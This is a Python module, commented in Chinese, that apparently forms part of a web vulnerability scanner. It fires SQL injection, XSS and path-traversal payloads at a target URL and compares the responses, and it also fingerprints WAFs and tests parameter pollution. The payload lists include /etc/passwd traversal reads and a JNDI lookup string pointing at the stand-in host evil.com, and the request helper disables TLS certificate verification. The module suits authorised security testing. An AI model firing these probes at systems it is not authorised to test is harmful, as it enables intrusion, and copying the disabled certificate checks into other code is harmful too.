"""
运行时差分探测模块 (runtime_diff)
基于 VulnClaw 项目功能实现:
- SQL 注入差分检测 (布尔盲注/报错注入/时间盲注)
- XSS 差分检测
- LFI 差分检测
- SSRF 差分检测
- WAF 行为检测 (恶意 payload 响应差异)
- 参数污染测试
- 响应差异分析 (长度/状态码/内容相似度)
"""

import re
import ssl
import time
import difflib
import urllib.request
import urllib.error
import urllib.parse
from typing import Dict, List, Optional, Any


# SQL 注入 payload 对 (正常 vs 恶意)
SQLI_PAIRS = [
    # 布尔型
    {"normal": "1", "malicious": "1' AND '1'='1", "false": "1' AND '1'='2"},
    {"normal": "1", "malicious": "1 AND 1=1", "false": "1 AND 1=2"},
    {"normal": "1", "malicious": "1) AND (1=1", "false": "1) AND (1=2"},
    # 报错型
    {"normal": "1", "malicious": "1' AND extractvalue(1,concat(0x7e,user()))--", "false": ""},
    {"normal": "1", "malicious": "1 AND updatexml(1,concat(0x7e,user()),1)--", "false": ""},
    # 时间型
    {"normal": "1", "malicious": "1' AND SLEEP(3)--", "false": ""},
    {"normal": "1", "malicious": "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "false": ""},
]

# XSS payload
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

# LFI payload
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
]

# WAF 检测 payload (如果被 WAF 拦截, 响应会不同)
WAF_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "UNION SELECT NULL--",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
]


def _make_ssl_context() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _http_request(url: str, timeout: int = 10, method: str = "GET",
                  data: Optional[bytes] = None,
                  headers: Optional[Dict] = None) -> Optional[Dict]:
    """发起 HTTP 请求"""
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close",
    }
    if headers:
        default_headers.update(headers)

    start = time.time()
    try:
        req = urllib.request.Request(url, data=data, headers=default_headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ssl_context()) as resp:
            status = resp.status
            resp_headers = dict(resp.headers)
            body = resp.read(300000).decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        status = e.code
        resp_headers = dict(e.headers) if e.headers else {}
        body = e.read(300000).decode("utf-8", errors="ignore") if e.fp else ""
    except Exception as e:
        elapsed = time.time() - start
        return {"url": url, "error": str(e)[:200], "elapsed": round(elapsed, 3)}

    elapsed = time.time() - start
    return {
        "url": url,
        "status": status,
        "length": len(body),
        "elapsed": round(elapsed, 3),
        "body": body,
        "headers": resp_headers,
    }


def _similarity(a: str, b: str) -> float:
    """计算两个字符串的相似度 (0-1)"""
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:2000], b[:2000]).ratio()


def _build_url(base: str, param: str, value: str) -> str:
    """构造带参数的 URL"""
    if "?" in base:
        sep = "&"
    else:
        sep = "?"
    # 如果 URL 已包含该参数, 替换之
    if re.search(rf"[?&]{re.escape(param)}=", base):
        return re.sub(rf"({re.escape(param)}=)[^&]*", rf"\g<1>{urllib.parse.quote(value, safe='')}", base)
    return f"{base}{sep}{param}={urllib.parse.quote(value, safe='')}"


def diff_sqli(url: str, param: str, timeout: int = 10) -> Dict:
    """SQL 注入差分检测"""
    findings = []
    is_vuln = False

    for pair in SQLI_PAIRS:
        # 正常请求
        normal_url = _build_url(url, param, pair["normal"])
        normal_resp = _http_request(normal_url, timeout=timeout)
        if normal_resp.get("error"):
            continue

        # 恶意请求 (true 条件)
        true_url = _build_url(url, param, pair["malicious"])
        true_resp = _http_request(true_url, timeout=timeout)
        if true_resp.get("error"):
            continue

        # 时间盲注检测
        if "SLEEP" in pair["malicious"].upper() or "sleep" in pair["malicious"]:
            if true_resp["elapsed"] >= 2.5:
                findings.append({
                    "type": "time_based_sqli",
                    "payload": pair["malicious"],
                    "evidence": f"响应时间 {true_resp['elapsed']}s >= 2.5s (基线 {normal_resp['elapsed']}s)",
                    "confidence": "high",
                })
                is_vuln = True
            continue

        # 报错注入检测
        error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
            r"ORA-\d{5}", r"PostgreSQL.*ERROR", r"SQLite3::",
            r"Microsoft SQL Server.*error", r"Unclosed quotation mark",
            r"extractvalue", r"updatexml", r"Duplicate entry",
        ]
        is_error = any(re.search(p, true_resp["body"], re.I) for p in error_patterns)
        if is_error:
            findings.append({
                "type": "error_based_sqli",
                "payload": pair["malicious"],
                "evidence": "响应中包含 SQL 错误信息",
                "confidence": "high",
            })
            is_vuln = True
            continue

        # 布尔盲注检测
        if pair.get("false"):
            false_url = _build_url(url, param, pair["false"])
            false_resp = _http_request(false_url, timeout=timeout)
            if false_resp.get("error"):
                continue

            true_sim = _similarity(normal_resp["body"], true_resp["body"])
            false_sim = _similarity(normal_resp["body"], false_resp["body"])

            # true 条件响应与正常相似, false 条件响应不同 → 布尔盲注
            if true_sim > 0.8 and false_sim < 0.7 and (true_sim - false_sim) > 0.2:
                findings.append({
                    "type": "boolean_based_sqli",
                    "payload_true": pair["malicious"],
                    "payload_false": pair["false"],
                    "evidence": f"true相似度={true_sim:.2f}, false相似度={false_sim:.2f}",
                    "confidence": "medium",
                })
                is_vuln = True

    return {
        "url": url,
        "param": param,
        "vulnerable": is_vuln,
        "findings": findings,
    }


def diff_xss(url: str, param: str, timeout: int = 10) -> Dict:
    """XSS 差分检测"""
    findings = []
    is_vuln = False

    for payload in XSS_PAYLOADS:
        # 用唯一标记包裹, 便于检测反射
        marker = "xXsStEsT"
        test_payload = marker + payload + marker
        test_url = _build_url(url, param, test_payload)
        resp = _http_request(test_url, timeout=timeout)
        if resp.get("error"):
            continue

        body = resp["body"]
        # 检测 payload 是否被原样反射
        if payload in body:
            findings.append({
                "type": "reflected_xss",
                "payload": payload,
                "evidence": "Payload 原样反射在响应中",
                "confidence": "high",
            })
            is_vuln = True
            break

        # 检测 marker 是否被反射 (说明参数被输出但可能被过滤)
        if marker in body:
            # 检查是否被 HTML 编码
            encoded = (urllib.parse.quote(payload, safe='') in body or
                       payload.replace("<", "&lt;") in body)
            if not encoded:
                findings.append({
                    "type": "potential_xss",
                    "payload": payload,
                    "evidence": "参数被反射但未确认可执行",
                    "confidence": "low",
                })
                is_vuln = True
                break

    return {
        "url": url,
        "param": param,
        "vulnerable": is_vuln,
        "findings": findings,
    }


def diff_lfi(url: str, param: str, timeout: int = 10) -> Dict:
    """LFI 差分检测"""
    findings = []
    is_vuln = False

    for payload in LFI_PAYLOADS:
        test_url = _build_url(url, param, payload)
        resp = _http_request(test_url, timeout=timeout)
        if resp.get("error"):
            continue

        body = resp["body"]
        # 检测 /etc/passwd 特征
        passwd_pattern = r"root:[x*]:0:0:"
        if re.search(passwd_pattern, body):
            findings.append({
                "type": "lfi",
                "payload": payload,
                "evidence": "响应中包含 /etc/passwd 内容 (root:x:0:0:)",
                "confidence": "high",
            })
            is_vuln = True
            break

        # 检测 Windows 路径特征
        win_pattern = r"\[boot loader\]|boot\.ini|C:\\\\Windows"
        if re.search(win_pattern, body, re.I):
            findings.append({
                "type": "lfi_windows",
                "payload": payload,
                "evidence": "响应中包含 Windows 系统文件内容",
                "confidence": "high",
            })
            is_vuln = True
            break

    return {
        "url": url,
        "param": param,
        "vulnerable": is_vuln,
        "findings": findings,
    }


def diff_waf(url: str, timeout: int = 8) -> Dict:
    """WAF 行为检测: 发送恶意 payload, 比较响应差异判断是否被 WAF 拦截"""
    # 基线请求
    baseline = _http_request(url, timeout=timeout)
    if baseline.get("error"):
        return {"url": url, "error": baseline["error"]}

    results = []
    waf_detected = False
    waf_signatures = []

    for payload in WAF_PAYLOADS:
        test_url = _build_url(url, "test", payload) if "?" not in url else \
            f"{url}&test={urllib.parse.quote(payload, safe='')}"
        resp = _http_request(test_url, timeout=timeout)
        if resp.get("error"):
            results.append({"payload": payload[:40], "blocked": False, "note": "请求失败"})
            continue

        blocked = False
        # 判断是否被拦截: 状态码 403/406/429/503, 或响应长度骤减, 或相似度极低
        sim = _similarity(baseline["body"], resp["body"])
        if resp["status"] in (403, 406, 429, 503):
            blocked = True
        elif sim < 0.3 and resp["length"] < baseline["length"] * 0.3:
            blocked = True
        elif resp["status"] == 200 and sim < 0.2:
            blocked = True

        if blocked:
            waf_detected = True
            # 尝试识别 WAF 产品
            server = resp["headers"].get("Server", "").lower()
            known_waf = {
                "cloudflare": "Cloudflare", "akamai": "Akamai", "imperva": "Imperva",
                "f5": "F5 BIG-IP", "barracuda": "Barracuda", "sucuri": "Sucuri",
                "modsecurity": "ModSecurity", "aws": "AWS WAF", "aliyun": "阿里云WAF",
                "tencent": "腾讯云WAF", "baishan": "白山云", "qianxin": "奇安信",
                "fortinet": "Fortinet", "sangfor": "深信服",
            }
            for key, name in known_waf.items():
                if key in server or key in resp["body"].lower():
                    if name not in waf_signatures:
                        waf_signatures.append(name)

        results.append({
            "payload": payload[:40],
            "status": resp["status"],
            "baseline_status": baseline["status"],
            "length": resp["length"],
            "baseline_length": baseline["length"],
            "similarity": round(sim, 3),
            "blocked": blocked,
        })

    return {
        "url": url,
        "waf_detected": waf_detected,
        "waf_signatures": waf_signatures,
        "baseline_status": baseline["status"],
        "baseline_length": baseline["length"],
        "results": results,
    }


def diff_response(url1: str, url2: str, timeout: int = 10) -> Dict:
    """两个 URL 响应差异分析"""
    r1 = _http_request(url1, timeout=timeout)
    r2 = _http_request(url2, timeout=timeout)

    if r1.get("error") or r2.get("error"):
        return {"url1": url1, "url2": url2,
                "error1": r1.get("error"), "error2": r2.get("error")}

    sim = _similarity(r1["body"], r2["body"])
    diff_ratio = 1 - sim

    # 生成差异摘要
    lines1 = r1["body"].splitlines()
    lines2 = r2["body"].splitlines()
    diff = list(difflib.unified_diff(lines1, lines2, lineterm="", n=1))
    diff_preview = "\n".join(diff[:30])

    return {
        "url1": url1,
        "url2": url2,
        "status1": r1["status"],
        "status2": r2["status"],
        "length1": r1["length"],
        "length2": r2["length"],
        "elapsed1": r1["elapsed"],
        "elapsed2": r2["elapsed"],
        "similarity": round(sim, 4),
        "diff_ratio": round(diff_ratio, 4),
        "has_diff": diff_ratio > 0.05,
        "diff_preview": diff_preview[:2000],
    }


def diff_param_pollution(url: str, param: str, timeout: int = 10) -> Dict:
    """参数污染测试 (HPP): 检测多个同名参数的处理行为"""
    # 单个参数请求
    single_url = _build_url(url, param, "value1")
    single_resp = _http_request(single_url, timeout=timeout)

    # 多个同名参数
    if "?" in url:
        polluted_url = f"{url}&{param}=value1&{param}=value2"
    else:
        polluted_url = f"{url}?{param}=value1&{param}=value2"
    polluted_resp = _http_request(polluted_url, timeout=timeout)

    if single_resp.get("error") or polluted_resp.get("error"):
        return {"url": url, "param": param,
                "error": "请求失败",
                "single_error": single_resp.get("error"),
                "polluted_error": polluted_resp.get("error")}

    sim = _similarity(single_resp["body"], polluted_resp["body"])

    # 判断行为: 取第一个值 / 取最后一个值 / 拼接
    behavior = "unknown"
    if "value1" in polluted_resp["body"] and "value2" not in polluted_resp["body"]:
        behavior = "first_wins"
    elif "value2" in polluted_resp["body"] and "value1" not in polluted_resp["body"]:
        behavior = "last_wins"
    elif "value1" in polluted_resp["body"] and "value2" in polluted_resp["body"]:
        behavior = "concatenated_or_both"

    return {
        "url": url,
        "param": param,
        "behavior": behavior,
        "single_status": single_resp["status"],
        "polluted_status": polluted_resp["status"],
        "single_length": single_resp["length"],
        "polluted_length": polluted_resp["length"],
        "similarity": round(sim, 4),
        "vulnerable_to_hpp": behavior in ("first_wins", "last_wins") and sim < 0.95,
    }


def runtime_diff_list() -> Dict:
    """列出所有运行时差分探测功能"""
    return {
        "sqli": "SQL注入差分检测(布尔/报错/时间盲注)",
        "xss": "XSS反射型差分检测",
        "lfi": "LFI本地文件包含差分检测",
        "waf": "WAF行为检测(恶意payload拦截分析)",
        "response": "两URL响应差异分析",
        "hpp": "参数污染测试(HPP)",
    }
